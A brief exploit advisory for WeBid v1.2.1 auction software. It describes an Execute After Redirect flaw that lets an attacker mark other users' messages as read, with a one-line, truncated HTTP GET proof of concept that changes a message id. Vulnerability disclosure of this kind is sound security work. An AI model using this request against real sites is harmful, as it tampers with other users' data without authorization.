# Exploit Title: Webid v1.2.1 - Execute After Redirect(EAR)
## Date: 2/1/2024
## Vendor Homepage: https://sourceforge.net/projects/simpleauction/files/latest/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: Webid
## Version: v1.2.1
## Exploit Description:
## Webid v1.2.1 suffers from EAR - Execute After Redirect Vulnerability allowing attackers to mark message as read that is owned by other user.

## ---------------------------------POC-----------------------------
```
GET /yourmessages.php?id=9(CHANGE HERE) HTTP/1.1
...
```